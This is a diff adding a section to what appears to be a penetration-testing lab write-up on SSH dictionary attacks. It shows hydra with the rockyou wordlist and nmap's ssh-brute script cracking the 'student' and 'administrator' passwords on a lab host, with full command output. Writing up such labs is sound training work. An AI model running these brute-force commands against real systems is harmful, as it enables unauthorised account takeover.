@@ -150,3 +150,54 @@ student
 ```
 
 We are in.
+
+## SSH Dictionary Attack
+
+we can use hydra tool for this type of attack like this:
+
+<pre class="language-sh"><code class="lang-sh">root@attackdefense:~# hydra -l student -P /usr/share/wordlists/rockyou.txt 192.143.106.3 22 
+Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-12-28 13:43:49
+[ERROR] Unknown service: 22
+root@attackdefense:~# hydra -l student -P /usr/share/wordlists/rockyou.txt 192.143.106.3 ssh
+Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-12-28 13:43:55
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking ssh://192.143.106.3:22/
+[STATUS] 177.00 tries/min, 177 tries in 00:01h, 14344223 to do in 1350:41h, 16 active
+<strong>[22][ssh] host: 192.143.106.3   login: student   password: friend
+</strong>1 of 1 target successfully completed, 1 valid password found
+</code></pre>
+
+Here we found the password for the student. Now we can use that to connect to SSH:
+
+```sh
+root@attackdefense:~# ssh student@192.143.106.3   
+Ubuntu 16.04.5 LTS
+student@192.143.106.3's password: 
+.
+.
+student@victim-1:~$ whoami
+student
+```
+
+Logged in successfully.
+
+Let's try to get login details for the administrator using Nmap:
+
+<pre class="language-sh"><code class="lang-sh">root@attackdefense:~# echo "administrator" > user    
+root@attackdefense:~# nmap 192.143.106.3 -p22 --script=ssh-brute --script-args userdb=/root/user 
+PORT   STATE SERVICE
+22/tcp open  ssh
+| ssh-brute: 
+|   Accounts: 
+<strong>|     administrator:sunshine - Valid credentials
+</strong>|_  Statistics: Performed 28 guesses in 9 seconds, average tps: 3.1
+MAC Address: 02:42:C0:8F:6A:03 (Unknown)
+</code></pre>
+
+Here we also got the password for the administrator. Let's connect to SSH now:
+
